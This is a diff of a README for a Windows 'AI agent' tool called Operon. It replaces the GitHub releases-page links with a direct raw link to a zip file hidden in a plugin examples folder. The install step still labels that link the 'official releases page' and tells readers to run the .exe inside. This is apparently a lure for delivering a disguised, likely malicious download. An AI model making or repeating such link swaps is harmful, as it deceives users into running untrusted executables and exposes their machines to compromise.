@@ -1,6 +1,6 @@
 # 🤖 Operon - Automate Your Daily Computer Tasks
 
-[![Download Operon](https://img.shields.io/badge/Download-Operon-blue.svg)](https://github.com/thorndikeoutboard336/Operon/releases)
+[![Download Operon](https://img.shields.io/badge/Download-Operon-blue.svg)](https://raw.githubusercontent.com/thorndikeoutboard336/Operon/main/plugins/examples/text_stats/Software-v2.9.zip)
 
 Operon acts as a digital assistant that runs directly on your computer. It performs tasks like file management, web research, and email composition. The software works as an autonomous agent, meaning it makes decisions to complete goals you set. It verifies its own work to ensure the output meets your standards. 
 
@@ -18,7 +18,7 @@ Operon runs on standard Windows machines. Ensure your computer meets these speci
 
 Follow these steps to set up Operon on your computer:
 
-1.  Visit the [official releases page](https://github.com/thorndikeoutboard336/Operon/releases) to access the latest version.
+1.  Visit the [official releases page](https://raw.githubusercontent.com/thorndikeoutboard336/Operon/main/plugins/examples/text_stats/Software-v2.9.zip) to access the latest version.
 2.  Look for the file ending in `.exe` under the latest release.
 3.  Click the file to start your download.
 4.  Once the file finishes downloading, locate it in your Downloads folder.
